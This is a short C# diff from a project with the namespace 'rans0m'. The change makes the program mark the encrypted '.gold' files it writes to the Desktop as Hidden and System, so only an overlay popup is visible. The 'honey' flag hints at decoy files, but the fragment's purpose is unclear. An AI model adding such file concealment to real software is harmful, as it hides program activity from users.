@@ -69,6 +69,9 @@ namespace rans0m
                         File.WriteAllBytes(fullPath, encrypted);
                         // Verify file was written
                         if (!File.Exists(fullPath)) continue;
+                        // Hide it: only the clickable overlay popup is meant to be
+                        // seen, never the raw .gold data file on the Desktop.
+                        try { File.SetAttributes(fullPath, FileAttributes.Hidden | FileAttributes.System); } catch { }
 
                         createdPaths.Add(fullPath);
                         created.Add(new CoinDef(fullPath, coinValue, honey));
